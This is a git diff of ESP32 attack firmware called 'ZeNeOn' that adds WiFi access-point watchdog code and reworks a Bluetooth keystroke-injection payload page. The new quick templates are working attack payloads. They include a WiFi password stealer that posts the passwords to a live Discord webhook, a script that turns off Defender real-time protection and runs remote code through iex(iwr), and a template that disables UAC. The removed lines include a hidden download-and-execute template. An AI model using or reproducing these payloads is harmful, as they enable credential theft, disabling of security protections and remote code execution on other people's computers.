@@ -57,6 +57,18 @@ String payloadStatus = "idle";
 String lastPayloadLine = "";
 unsigned long bleDisconnectTime = 0;  // millis() when disconnect detected (grace period)
 const unsigned long BLE_RECONNECT_GRACE_MS = 8000; // 8s grace before aborting
+bool bleWasConnected = false;         // track previous connection state
+unsigned long bleLastConnChange = 0;  // millis() of last connect/disconnect event
+const unsigned long BLE_CONN_SETTLE_MS = 2000; // ignore state changes during settle period
+
+/* ============ WIFI AP WATCHDOG ============ */
+unsigned long lastAPCheck = 0;
+const unsigned long AP_CHECK_INTERVAL = 10000;  // check every 10s
+unsigned long lastHeapLog = 0;
+const unsigned long HEAP_LOG_INTERVAL = 30000;  // log heap every 30s
+unsigned long apRestartCount = 0;
+bool apRecoveryInProgress = false;
+void restartWiFiAP();  // forward declaration
 
 /* ============ AUTOMATED ATTACK PHASES ============ */
 enum AttackPhase {
@@ -1988,12 +2000,12 @@ int countPayloadLines(String &buf) {
 String payloadInjectorUI() {
   return header() + R"rawliteral(
 <div class="card">
-<h3>⌨ Payload Injector (BLE)</h3>
+<h3>Payload Injector (BLE)</h3>
 <p style="margin-bottom:10px;opacity:0.7">ESP32 acts as a Bluetooth HID keyboard. Pair the target device with <strong>"ZeNeOn"</strong> then inject C++ Keyboard payloads via BLE keystroke injection.</p>
 <div id="bleStatus" class="status">BLE Keyboard not started</div>
 <div class="grid">
-<button class="success" onclick="startBLE()" id="startBtn">⚡ Start BLE Keyboard</button>
-<button class="danger" onclick="stopBLE()" id="stopBtn">⬛ Stop BLE Keyboard</button>
+<button class="success" onclick="startBLE()" id="startBtn">Start BLE Keyboard</button>
+<button class="danger" onclick="stopBLE()" id="stopBtn">Stop BLE Keyboard</button>
 </div>
 </div>
 
@@ -2020,8 +2032,8 @@ delay(1000);
 Keyboard.print(&quot;Hello from ZeNeOn!&quot;);"></textarea>
 </div>
 <div class="grid" style="margin-top:10px">
-<button onclick="injectPayload()" id="injectBtn">🚀 Execute Payload</button>
-<button class="danger" onclick="abortPayload()" id="abortBtn">⬛ Abort</button>
+<button onclick="injectPayload()" id="injectBtn">Execute Payload</button>
+<button class="danger" onclick="abortPayload()" id="abortBtn">Abort</button>
 </div>
 
 <h3 style="margin-top:18px;font-size:13px">Quick Templates</h3>
@@ -2029,25 +2041,13 @@ Keyboard.print(&quot;Hello from ZeNeOn!&quot;);"></textarea>
 <button class="secondary" onclick="loadTemplate(1)" style="font-size:12px">Notepad Demo</button>
 <button class="secondary" onclick="loadTemplate(2)" style="font-size:12px">PowerShell</button>
 <button class="secondary" onclick="loadTemplate(3)" style="font-size:12px">CMD Prompt</button>
-<button class="secondary" onclick="loadTemplate(4)" style="font-size:12px">Lock PC</button>
-<button class="secondary" onclick="loadTemplate(5)" style="font-size:12px">WiFi Pass Grab</button>
-<button class="secondary" onclick="loadTemplate(6)" style="font-size:12px">Sysinfo Recon</button>
-<button class="secondary" onclick="loadTemplate(7)" style="font-size:12px">Create Folder</button>
-<button class="secondary" onclick="loadTemplate(8)" style="font-size:12px">Open Website</button>
-<button class="secondary" onclick="loadTemplate(9)" style="font-size:12px">Wallpaper Msg</button>
-<button class="secondary" onclick="loadTemplate(10)" style="font-size:12px">Download & Run</button>
+<button class="secondary" onclick="loadTemplate(4)" style="font-size:12px">WiFi Pass Grab</button>
+<button class="secondary" onclick="loadTemplate(5)" style="font-size:12px">Create Folder</button>
+<button class="secondary" onclick="loadTemplate(6)" style="font-size:12px">Wallpaper Msg</button>
+<button class="secondary" onclick="loadTemplate(7)" style="font-size:12px">WiFi Stealer Discord</button>
+<button class="secondary" onclick="loadTemplate(8)" style="font-size:12px">RickRoll Prank</button>
+<button class="secondary" onclick="loadTemplate(9)" style="font-size:12px">Turn Off Defender</button>
 </div>
-</div>
-
-<div class="card">
-<h3>💾 Saved Payloads</h3>
-<p style="margin-bottom:8px;opacity:0.7;font-size:12px">Save current payload to ESP32 storage or load a previously saved one</p>
-<div style="display:flex;gap:8px;margin-bottom:10px">
-<input id="saveName" placeholder="Payload name (e.g. wifi_grab)" style="flex:1;margin-top:0">
-<button class="success" onclick="savePayload()" style="width:auto;padding:10px 16px;margin-top:0">💾 Save</button>
-</div>
-<div id="savedList" style="margin-top:8px"><div style="color:#5599cc;font-size:12px">Loading saved payloads...</div></div>
-<button class="secondary" onclick="refreshSaved()" style="margin-top:8px;font-size:12px">⟳ Refresh List</button>
 </div>
 
 <div class="card" id="execCard">
@@ -2104,20 +2104,20 @@ var startBLE=function(){
   document.getElementById('startBtn').textContent='Starting...';
   fetch('/payload/start').then(r=>r.json()).then(d=>{
     document.getElementById('startBtn').disabled=false;
-    document.getElementById('startBtn').textContent='⚡ Start BLE Keyboard';
+    document.getElementById('startBtn').textContent='Start BLE Keyboard';
     if(d.ok){
       document.getElementById('bleStatus').className='status success';
-      document.getElementById('bleStatus').innerHTML='⚡ BLE Keyboard active — advertising as <strong>"ZeNeOn"</strong>. Pair the target device now.';
-      addExecLog('⚡ BLE Keyboard started — waiting for device to pair...','#00ff88');
+      document.getElementById('bleStatus').innerHTML='BLE Keyboard active — advertising as <strong>"ZeNeOn"</strong>. Pair the target device now.';
+      addExecLog('BLE Keyboard started — waiting for device to pair...','#00ff88');
       startBlePoll();
     } else {
       document.getElementById('bleStatus').className='status error';
       document.getElementById('bleStatus').innerHTML=d.msg;
-      addExecLog('✗ '+d.msg,'#ff4444');
+      addExecLog('Error: '+d.msg,'#ff4444');
     }
   }).catch(function(e){
     document.getElementById('startBtn').disabled=false;
-    document.getElementById('startBtn').textContent='⚡ Start BLE Keyboard';
+    document.getElementById('startBtn').textContent='Start BLE Keyboard';
   });
 }
 var stopBLE=function(){
@@ -2126,21 +2126,24 @@ var stopBLE=function(){
   fetch('/payload/stop').then(r=>r.text()).then(d=>{
     document.getElementById('bleStatus').className='status';
     document.getElementById('bleStatus').innerHTML='BLE Keyboard stopped.';
-    addExecLog('⬛ BLE Keyboard stopped','#ff4444');
+    addExecLog('BLE Keyboard stopped','#ff4444');
   });
 }
 var startBlePoll=function(){
   if(blePoll) clearInterval(blePoll);
+  var connPollRate=3500;
   blePoll=setInterval(function(){
     fetch('/payload/status').then(r=>r.json()).then(d=>{
       if(d.connected){
         document.getElementById('bleStatus').className='status success';
-        document.getElementById('bleStatus').innerHTML='✓ Device connected via BLE! Ready to inject payloads.';
+        document.getElementById('bleStatus').innerHTML='Device connected via BLE! Ready to inject payloads.';
         document.getElementById('execBlink').style.color='#00ff88';
+        if(connPollRate!==5000){connPollRate=5000;clearInterval(blePoll);startBlePoll();return;}
       } else if(d.started){
         document.getElementById('bleStatus').className='status warning';
-        document.getElementById('bleStatus').innerHTML='⏳ Advertising as "ZeNeOn" — waiting for target device to pair...';
+        document.getElementById('bleStatus').innerHTML='Advertising as "ZeNeOn" — waiting for target device to pair...';
         document.getElementById('execBlink').style.color='#ffaa00';
+        if(connPollRate!==3500){connPollRate=3500;clearInterval(blePoll);startBlePoll();return;}
       } else {
         document.getElementById('bleStatus').className='status';
         document.getElementById('bleStatus').innerHTML='BLE Keyboard not started';
@@ -2156,15 +2159,15 @@ var startBlePoll=function(){
         document.getElementById('execProg').style.width='100%';
         document.getElementById('execStatus').classList.remove('hidden');
         document.getElementById('execStatus').className='status success';
-        document.getElementById('execStatus').innerHTML='✓ Payload execution complete! ('+d.linesExec+' lines)';
+        document.getElementById('execStatus').innerHTML='Payload execution complete! ('+d.linesExec+' lines)';
       }
     }).catch(function(){});
-  },2500);
+  },connPollRate);
 }
 var injectPayload=function(){
   var pl=document.getElementById('payload').value;
   if(!pl.trim()){
-    addExecLog('✗ No payload entered','#ff4444');return;
+    addExecLog('No payload entered','#ff4444');return;
   }
   document.getElementById('injectBtn').disabled=true;
   document.getElementById('injectBtn').textContent='Sending...';
@@ -2172,24 +2175,24 @@ var injectPayload=function(){
   document.getElementById('execStatus').classList.add('hidden');
   var term=document.getElementById('execTerminal');
   term.innerHTML='';
-  addExecLog('🚀 Sending payload ('+pl.length+' bytes)...','#ffaa00');
+  addExecLog('Sending payload ('+pl.length+' bytes)...','#ffaa00');
   fetch('/payload/inject',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'payload='+encodeURIComponent(pl)}).then(r=>r.json()).then(d=>{
     document.getElementById('injectBtn').disabled=false;
-    document.getElementById('injectBtn').textContent='🚀 Execute Payload';
+    document.getElementById('injectBtn').textContent='Execute Payload';
     if(d.ok){
-      addExecLog('⚡ Executing '+d.lines+' lines...','#00ff88');
+      addExecLog('Executing '+d.lines+' lines...','#00ff88');
       startExecPoll();
     } else {
-      addExecLog('✗ '+d.msg,'#ff4444');
+      addExecLog('Error: '+d.msg,'#ff4444');
     }
   }).catch(function(){
     document.getElementById('injectBtn').disabled=false;
-    document.getElementById('injectBtn').textContent='🚀 Execute Payload';
+    document.getElementById('injectBtn').textContent='Execute Payload';
   });
 }
 var abortPayload=function(){
   fetch('/payload/abort').then(r=>r.text()).then(d=>{
-    addExecLog('⬛ Payload aborted','#ff4444');
+    addExecLog('Payload aborted','#ff4444');
     document.getElementById('execProg').style.width='0%';
     document.getElementById('execStatus').classList.remove('hidden');
     document.getElementById('execStatus').className='status error';
@@ -2226,12 +2229,12 @@ var startExecPoll=function(){
         document.getElementById('execProg').style.width='100%';
         document.getElementById('execStatus').classList.remove('hidden');
         document.getElementById('execStatus').className='status success';
-        document.getElementById('execStatus').innerHTML='✓ Payload complete — '+d.linesExec+' lines executed';
-        addExecLog('★ Payload execution complete!','#00ff88');
+        document.getElementById('execStatus').innerHTML='Payload complete — '+d.linesExec+' lines executed';
+        addExecLog('Payload execution complete!','#00ff88');
       }
       if(!d.executing && d.status=='aborted'){
         clearInterval(execPoll);
-        addExecLog('⬛ Aborted','#ff4444');
+        addExecLog('Aborted','#ff4444');
       }
     }).catch(function(){});
   },800);
@@ -2252,67 +2255,26 @@ var loadTemplate=function(id){
       t="// Open CMD and run commands\ndelay(1000);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('r');\ndelay(80);\nKeyboard.releaseAll();\ndelay(500);\nKeyboard.print(\"cmd\");\ndelay(60);\nKeyboard.write(KEY_RETURN);\ndelay(1000);\nKeyboard.print(\"echo ZeNeOn Framework Active\");\nKeyboard.write(KEY_RETURN);\nKeyboard.print(\"ipconfig\");\nKeyboard.write(KEY_RETURN);\n";
       break;
     case 4:
-      t="// Lock the Windows PC\ndelay(500);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('l');\ndelay(80);\nKeyboard.releaseAll();\n";
-      break;
-    case 5:
       t="// WiFi Password Grabber\ndelay(1000);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('r');\ndelay(80);\nKeyboard.releaseAll();\ndelay(500);\nKeyboard.print(\"cmd /k mode con: cols=25 lines=1\");\ndelay(60);\nKeyboard.write(KEY_RETURN);\ndelay(700);\nKeyboard.print(\"cd %temp%\");\nKeyboard.write(KEY_RETURN);\ndelay(200);\nKeyboard.print(\"netsh wlan export profile key=clear\");\nKeyboard.write(KEY_RETURN);\ndelay(2000);\nKeyboard.print(\"powershell \\\"$x=ls Wi-Fi*.xml|%{$n=$_.Name -replace 'Wi-Fi-|-user.xml',''; $p=([xml](gc $_)).WLANProfile.MSM.security.sharedKey.keyMaterial; 'WiFi: '+$n+' | Pass: '+$p}; $x | Out-File wifi_dump.txt; notepad wifi_dump.txt\\\"\");\nKeyboard.write(KEY_RETURN);\ndelay(3000);\nKeyboard.print(\"del Wi*.xml /s/f/q\");\nKeyboard.write(KEY_RETURN);\ndelay(200);\nKeyboard.print(\"exit\");\nKeyboard.write(KEY_RETURN);\n";
       break;
-    case 6:
-      t="// System Recon\ndelay(1000);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('r');\ndelay(80);\nKeyboard.releaseAll();\ndelay(500);\nKeyboard.print(\"cmd\");\ndelay(60);\nKeyboard.write(KEY_RETURN);\ndelay(1000);\nKeyboard.print(\"echo === SYSTEM INFO === > %temp%\\\\recon.txt\");\nKeyboard.write(KEY_RETURN);\ndelay(100);\nKeyboard.print(\"hostname >> %temp%\\\\recon.txt\");\nKeyboard.write(KEY_RETURN);\ndelay(100);\nKeyboard.print(\"whoami >> %temp%\\\\recon.txt\");\nKeyboard.write(KEY_RETURN);\ndelay(100);\nKeyboard.print(\"ipconfig /all >> %temp%\\\\recon.txt\");\nKeyboard.write(KEY_RETURN);\ndelay(500);\nKeyboard.print(\"netsh wlan show profiles >> %temp%\\\\recon.txt\");\nKeyboard.write(KEY_RETURN);\ndelay(500);\nKeyboard.print(\"systeminfo >> %temp%\\\\recon.txt\");\nKeyboard.write(KEY_RETURN);\ndelay(3000);\nKeyboard.print(\"notepad %temp%\\\\recon.txt\");\nKeyboard.write(KEY_RETURN);\ndelay(200);\nKeyboard.print(\"exit\");\nKeyboard.write(KEY_RETURN);\n";
-      break;
-    case 7:
+    case 5:
       t="// Create a folder on desktop\ndelay(1000);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('r');\ndelay(80);\nKeyboard.releaseAll();\ndelay(500);\nKeyboard.print(\"cmd\");\ndelay(60);\nKeyboard.write(KEY_RETURN);\ndelay(1000);\nKeyboard.print(\"mkdir %userprofile%\\\\Desktop\\\\ZeNeOn_Was_Here\");\nKeyboard.write(KEY_RETURN);\ndelay(200);\nKeyboard.print(\"echo You have been visited by ZeNeOn > %userprofile%\\\\Desktop\\\\ZeNeOn_Was_Here\\\\readme.txt\");\nKeyboard.write(KEY_RETURN);\ndelay(200);\nKeyboard.print(\"exit\");\nKeyboard.write(KEY_RETURN);\n";
       break;
-    case 8:
-      t="// Open a website in default browser\ndelay(1000);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('r');\ndelay(80);\nKeyboard.releaseAll();\ndelay(500);\nKeyboard.print(\"https://github.com/InoshMatheesha/ZeNeOn-ESP32-WiFi-Framework\");\ndelay(60);\nKeyboard.write(KEY_RETURN);\n";
-      break;
-    case 9:
+    case 6:
       t="// Change wallpaper message via PowerShell\ndelay(1000);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('r');\ndelay(80);\nKeyboard.releaseAll();\ndelay(500);\nKeyboard.print(\"powershell\");\ndelay(60);\nKeyboard.write(KEY_RETURN);\ndelay(1500);\nKeyboard.print(\"Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class W{[DllImport(\\\"user32.dll\\\",CharSet=CharSet.Auto)]public static extern int SystemParametersInfo(int a,int b,string c,int d);}'; $f=[System.IO.Path]::GetTempPath()+'wp.bmp'; Add-Type -AssemblyName System.Drawing; $b=New-Object System.Drawing.Bitmap(1920,1080); $g=[System.Drawing.Graphics]::FromImage($b); $g.Clear([System.Drawing.Color]::Black); $g.DrawString('HACKED BY ZeNeOn',(New-Object System.Drawing.Font('Consolas',48)),[System.Drawing.Brushes]::Lime,(New-Object System.Drawing.PointF(300,450))); $b.Save($f); [W]::SystemParametersInfo(20,0,$f,3)\");\nKeyboard.write(KEY_RETURN);\ndelay(2000);\nKeyboard.print(\"exit\");\nKeyboard.write(KEY_RETURN);\n";
       break;
-    case 10:
-      t="// Download and execute (edit URL)\ndelay(1000);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('r');\ndelay(80);\nKeyboard.releaseAll();\ndelay(500);\nKeyboard.print(\"powershell -w hidden\");\ndelay(60);\nKeyboard.write(KEY_RETURN);\ndelay(1500);\nKeyboard.print(\"Invoke-WebRequest -Uri 'YOUR_URL_HERE' -OutFile $env:TEMP\\\\payload.exe; Start-Process $env:TEMP\\\\payload.exe\");\nKeyboard.write(KEY_RETURN);\ndelay(200);\nKeyboard.print(\"exit\");\nKeyboard.write(KEY_RETURN);\n";
+    case 7:
+      t="// WiFi Stealer - Send to Discord\ndelay(1000);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('r');\ndelay(100);\nKeyboard.releaseAll();\ndelay(100);\nKeyboard.print(\"cmd /k mode con: cols=25 lines=1\");\ndelay(100);\nKeyboard.write(KEY_RETURN);\ndelay(700);\nKeyboard.print(\"cd %temp%\");\nKeyboard.write(KEY_RETURN);\ndelay(200);\nKeyboard.print(\"netsh wlan export profile key=clear\");\nKeyboard.write(KEY_RETURN);\ndelay(100);\nKeyboard.print(\"powershell \\\"$x=ls Wi-Fi*.xml|%{$n=$_.Name -replace 'Wi-Fi-|-user.xml',''; $p=([xml](gc $_)).WLANProfile.MSM.security.sharedKey.keyMaterial; 'WiFi: '+$n+[char]10+'Password: '+$p+[char]10+'---'+[char]10}; $m='```'+[char]10+($x -join '')+[char]10+'```'; irm https://discord.com/api/webhooks/1444415675564163164/VEQFUHgHFHq6czlrPu1CCIABN-bb3OdLTXTh68MhKm_CEH4VPmDYkwVsVsu-giUKEPmO -Method POST -Body (ConvertTo-Json @{content=$m}) -ContentType 'application/json'\\\"\");\nKeyboard.write(KEY_RETURN);\ndelay(200);\nKeyboard.print(\"del Wi* /s/f/q\");\nKeyboard.write(KEY_RETURN);\ndelay(100);\nKeyboard.print(\"exit\");\nKeyboard.write(KEY_RETURN);\n";
+      break;
+    case 8:
+      t="// RickRoll Prank - Disable Defender + Execute RickRoll\ndelay(1000);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('r');\ndelay(100);\nKeyboard.releaseAll();\ndelay(300);\nKeyboard.print(\"powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs\");\ndelay(300);\nKeyboard.write(KEY_RETURN);\ndelay(2500);\nKeyboard.write(KEY_LEFT_ARROW);\ndelay(200);\nKeyboard.write(KEY_RETURN);\ndelay(1500);\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.press('r');\ndelay(100);\nKeyboard.releaseAll();\ndelay(100);\nKeyboard.print(\"powershell -w hidden iex(iwr -useb 'https://raw.githubusercontent.com/InoshMatheesha/moody/refs/heads/main/rickrollPrank.ps1')\");\ndelay(200);\nKeyboard.write(KEY_RETURN);\n";
+      break;
+    case 9:
+      t="// Turn Off Defender - Disable UAC + Real-time Protection\ndelay(500);\n// Disable UAC\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.releaseAll();\ndelay(300);\nKeyboard.print(\"uac\");\ndelay(400);\nKeyboard.write(KEY_RETURN);\ndelay(500);\nKeyboard.write(KEY_DOWN_ARROW);\ndelay(50);\nKeyboard.write(KEY_DOWN_ARROW);\ndelay(50);\nKeyboard.write(KEY_DOWN_ARROW);\ndelay(300);\nKeyboard.write(KEY_TAB);\ndelay(200);\nKeyboard.write(KEY_RETURN);\ndelay(500);\nKeyboard.write(KEY_LEFT_ARROW);\ndelay(200);\nKeyboard.write(KEY_RETURN);\ndelay(300);\n// Disable Real-time Protection\nKeyboard.press(KEY_LEFT_GUI);\nKeyboard.releaseAll();\ndelay(300);\nKeyboard.print(\"virus protection\");\ndelay(200);\nKeyboard.write(KEY_RETURN);\ndelay(4000);\nKeyboard.write(KEY_TAB);\ndelay(100);\nKeyboard.write(KEY_TAB);\ndelay(100);\nKeyboard.write(KEY_TAB);\ndelay(100);\nKeyboard.write(KEY_TAB);\ndelay(400);\nKeyboard.write(KEY_RETURN);\ndelay(400);\nKeyboard.write(' ');\ndelay(400);\nKeyboard.press(KEY_LEFT_ALT);\nKeyboard.press(KEY_F4);\nKeyboard.releaseAll();\n";
       break;
   }
   document.getElementById('payload').value=t;
 }
-var savePayload=function(){
-  var name=document.getElementById('saveName').value.trim();
-  var pl=document.getElementById('payload').value;
-  if(!name){addExecLog('✗ Enter a name to save','#ff4444');return;}
-  if(!pl.trim()){addExecLog('✗ No payload to save','#ff4444');return;}
-  name=name.replace(/[^a-zA-Z0-9_-]/g,'_');
-  fetch('/payload/save',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'name='+encodeURIComponent(name)+'&payload='+encodeURIComponent(pl)}).then(r=>r.json()).then(d=>{
-    if(d.ok){addExecLog('💾 Saved: '+name,'#00ff88');refreshSaved();}else{addExecLog('✗ '+d.msg,'#ff4444');}
-  }).catch(function(){addExecLog('✗ Save failed','#ff4444');});
-}
-var refreshSaved=function(){
-  fetch('/payload/list').then(r=>r.json()).then(d=>{
-    var el=document.getElementById('savedList');
-    if(!d.payloads||d.payloads.length===0){el.innerHTML="<div style='color:#5599cc;font-size:12px'>No saved payloads yet. Write a payload and click Save.</div>";return;}
-    var h='';
-    d.payloads.forEach(function(p){
-      h+="<div class='net-item' style='display:flex;align-items:center;justify-content:space-between;padding:10px 12px'>";
-      h+="<div style='flex:1;cursor:pointer' onclick=\"loadSaved('"+p.name+"')\"><div class='net-name'>💾 "+p.name+"</div><div class='net-details'>"+p.size+" bytes</div></div>";
-      h+="<button class='danger' onclick=\"deleteSaved('"+p.name+"')\" style='width:auto;padding:6px 12px;margin:0;font-size:11px'>✗</button>";
-      h+="</div>";
-    });
-    el.innerHTML=h;
-  }).catch(function(){document.getElementById('savedList').innerHTML="<div style='color:#ff4444;font-size:12px'>Failed to load list</div>";});
-}
-var loadSaved=function(name){
-  fetch('/payload/load?name='+encodeURIComponent(name)).then(r=>r.text()).then(d=>{
-    document.getElementById('payload').value=d;
-    document.getElementById('saveName').value=name;
-    addExecLog('📂 Loaded: '+name,'#00d4ff');
-  }).catch(function(){addExecLog('✗ Load failed','#ff4444');});
-}
-var deleteSaved=function(name){
-  if(!confirm('Delete payload "'+name+'"?')) return;
-  fetch('/payload/delete?name='+encodeURIComponent(name)).then(r=>r.json()).then(d=>{
-    if(d.ok){addExecLog('🗑 Deleted: '+name,'#ffaa00');refreshSaved();}else{addExecLog('✗ '+d.msg,'#ff4444');}
-  }).catch(function(){addExecLog('✗ Delete failed','#ff4444');});
-}
-window.addEventListener('load',function(){refreshSaved();});
 </script>
 <div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.2</div>
 </div></body></html>
@@ -2825,8 +2787,14 @@ void setupRoutes() {
       delay(500);
     }
 
+    // Use MIN_MODEM instead of turning WiFi off — keeps AP responsive
     esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
-    delay(100);
+    delay(200);
+    // Verify AP is still alive after PS mode change
+    if (WiFi.softAPIP() == IPAddress(0, 0, 0, 0)) {
+      Serial.println("[PAYLOAD] AP lost after PS change — recovering");
+      restartWiFiAP();
+    }
 
     // Initialize NimBLE once — never call end() so reconnection always works
     if (!bleNimbleReady) {
@@ -2840,6 +2808,8 @@ void setupRoutes() {
 
     bleKbStarted = true;
     bleDisconnectTime = 0;
+    bleWasConnected = false;
+    bleLastConnChange = millis();
     payloadStatus = "idle";
 
     Serial.printf("[PAYLOAD] BLE Keyboard activated (heap: %u)\n", ESP.getFreeHeap());
@@ -2864,9 +2834,17 @@ void setupRoutes() {
   });
 
   server.on("/payload/status", []() {
+    bool isConn = bleKbStarted && bleKeyboard.isConnected();
+    // Stabilization: report connected only if settled for BLE_CONN_SETTLE_MS
+    if (isConn && !bleWasConnected) {
+      // Just connected — check if it's been stable
+      if (millis() - bleLastConnChange < BLE_CONN_SETTLE_MS) {
+        isConn = false; // still settling, report as not-yet-connected
+      }
+    }
     String json = "{";
     json += "\"started\":" + String(bleKbStarted ? "true" : "false") + ",";
-    json += "\"connected\":" + String((bleKbStarted && bleKeyboard.isConnected()) ? "true" : "false") + ",";
+    json += "\"connected\":" + String(isConn ? "true" : "false") + ",";
     json += "\"executing\":" + String(payloadExecuting ? "true" : "false") + ",";
     json += "\"linesExec\":" + String(payloadLinesExecuted) + ",";
     json += "\"totalLines\":" + String(payloadTotalLines) + ",";
@@ -2919,93 +2897,6 @@ void setupRoutes() {
     Serial.println("[PAYLOAD] Aborted");
     addEvent("PAYLOAD: ABORTED");
     server.send(200, "text/plain", "Payload aborted");
-  });
-
-  /* --- Payload SPIFFS Save/Load/Delete/List --- */
-  server.on("/payload/save", HTTP_POST, []() {
-    String name = server.arg("name");
-    String pl = server.arg("payload");
-    if (name.length() == 0 || name.length() > 30) {
-      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"Invalid name (1-30 chars)\"}");
-      return;
-    }
-    if (pl.length() == 0 || pl.length() > 8192) {
-      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"Payload empty or too large (max 8KB)\"}");
-      return;
-    }
-    // Sanitize name
-    for (int i = 0; i < (int)name.length(); i++) {
-      char c = name.charAt(i);
-      if (!isalnum(c) && c != '_' && c != '-') name.setCharAt(i, '_');
-    }
-    String path = "/pl_" + name + ".txt";
-    File f = SPIFFS.open(path, FILE_WRITE);
-    if (!f) {
-      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"SPIFFS write failed\"}");
-      return;
-    }
-    f.print(pl);
-    f.close();
-    Serial.printf("[PAYLOAD] Saved: %s (%d bytes)\n", name.c_str(), pl.length());
-    addEvent("PAYLOAD: Saved '" + name + "' (" + String(pl.length()) + "B)");
-    server.send(200, "application/json", "{\"ok\":true}");
-  });
-
-  server.on("/payload/load", []() {
-    String name = server.arg("name");
-    if (name.length() == 0) {
-      server.send(400, "text/plain", "No name");
-      return;
-    }
-    String path = "/pl_" + name + ".txt";
-    if (!SPIFFS.exists(path)) {
-      server.send(404, "text/plain", "Payload not found");
-      return;
-    }
-    File f = SPIFFS.open(path, FILE_READ);
-    if (!f) {
-      server.send(500, "text/plain", "Read failed");
-      return;
-    }
-    String content = f.readString();
-    f.close();
-    server.send(200, "text/plain", content);
-  });
-
-  server.on("/payload/delete", []() {
-    String name = server.arg("name");
-    if (name.length() == 0) {
-      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"No name\"}");
-      return;
-    }
-    String path = "/pl_" + name + ".txt";
-    if (!SPIFFS.exists(path)) {
-      server.send(200, "application/json", "{\"ok\":false,\"msg\":\"Not found\"}");
-      return;
-    }
-    SPIFFS.remove(path);
-    Serial.printf("[PAYLOAD] Deleted: %s\n", name.c_str());
-    addEvent("PAYLOAD: Deleted '" + name + "'");
-    server.send(200, "application/json", "{\"ok\":true}");
-  });
-
-  server.on("/payload/list", []() {
-    String json = "{\"payloads\":[";
-    File root = SPIFFS.open("/");
-    File file = root.openNextFile();
-    bool first = true;
-    while (file) {
-      String fname = file.name();
-      if (fname.startsWith("/pl_") && fname.endsWith(".txt")) {
-        String name = fname.substring(4, fname.length() - 4);
-        if (!first) json += ",";
-        json += "{\"name\":\"" + name + "\",\"size\":" + String(file.size()) + "}";
-        first = false;
-      }
-      file = root.openNextFile();
-    }
-    json += "]}";
-    server.send(200, "application/json", json);
   });
 
   /* --- Stop everything --- */
@@ -3107,6 +2998,25 @@ void setup() {
       .cc = "US", .schan = 1, .nchan = 13, .policy = WIFI_COUNTRY_POLICY_AUTO};
   esp_wifi_set_country(&country);
 
+  // WiFi event handler for diagnostics and auto-recovery
+  WiFi.onEvent([](WiFiEvent_t event, WiFiEventInfo_t info) {
+    switch (event) {
+      case ARDUINO_EVENT_WIFI_AP_STACONNECTED:
+        Serial.printf("[WiFi] Client connected (total: %d)\n", WiFi.softAPgetStationNum());
+        break;
+      case ARDUINO_EVENT_WIFI_AP_STADISCONNECTED:
+        Serial.printf("[WiFi] Client disconnected (remaining: %d)\n", WiFi.softAPgetStationNum());
+        break;
+      case ARDUINO_EVENT_WIFI_AP_STOP:
+        Serial.println("[WiFi] WARNING: AP stopped unexpectedly!");
+        // Flag for recovery in loop()
+        apRecoveryInProgress = true;
+        break;
+      default:
+        break;
+    }
+  });
+
   // Don't enable promiscuous at startup — only when attack starts
   // BLE Keyboard is initialized on-demand (not at boot) to avoid WiFi conflict
   setupRoutes();
@@ -3114,14 +3024,71 @@ void setup() {
   Serial.printf("[+] Web UI: http://%s\n", apIP.toString().c_str());
   Serial.println("[+] SYSTEM READY\n");
   randomSeed(esp_random());
+  lastAPCheck = millis();
+  lastHeapLog = millis();
 }
 
 /* ============ MAIN LOOP (PHASE STATE MACHINE) ============ */
+// Restart the WiFi AP — used by watchdog and recovery
+void restartWiFiAP() {
+  Serial.println("[WiFi] Restarting AP...");
+  WiFi.softAPdisconnect(true);
+  delay(300);
+  WiFi.mode(WIFI_AP_STA);
+  delay(100);
+  
+  // Determine channel — use target channel during active attack, else ch1
+  int ch = (currentPhase != PHASE_IDLE && targetChannel > 0) ? targetChannel : 1;
+  WiFi.softAP("ZeNeOn", "88881234", ch);
+  delay(300);
+  WiFi.softAPmacAddress(ownAPMAC);
+  dnsServer.stop();
+  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
+  
+  esp_wifi_set_ps(bleKbStarted ? WIFI_PS_MIN_MODEM : WIFI_PS_NONE);
+  esp_wifi_set_max_tx_power(84);
+  
+  apRestartCount++;
+  apRecoveryInProgress = false;
+  Serial.printf("[WiFi] AP restored on CH%d | IP: %s (restart #%lu, heap: %u)\n",
+                ch, WiFi.softAPIP().toString().c_str(), apRestartCount, ESP.getFreeHeap());
+  addEvent("WiFi AP auto-recovered (restart #" + String(apRestartCount) + ")");
+}
+
 void loop() {
   dnsServer.processNextRequest();
   server.handleClient();
 
   unsigned long now = millis();
+
+  /* ---- WIFI AP WATCHDOG ---- */
+  // Immediate recovery if AP stop event was detected
+  if (apRecoveryInProgress && !evilTwinActive) {
+    restartWiFiAP();
+  }
+  // Periodic AP health check
+  if (now - lastAPCheck >= AP_CHECK_INTERVAL) {
+    lastAPCheck = now;
+    IPAddress apIP = WiFi.softAPIP();
+    if (apIP == IPAddress(0, 0, 0, 0) && !evilTwinActive) {
+      // AP has no IP — it crashed
+      Serial.println("[WiFi] WATCHDOG: AP has no IP! Restarting...");
+      restartWiFiAP();
+    }
+  }
+  // Periodic heap monitoring
+  if (now - lastHeapLog >= HEAP_LOG_INTERVAL) {
+    lastHeapLog = now;
+    uint32_t freeHeap = ESP.getFreeHeap();
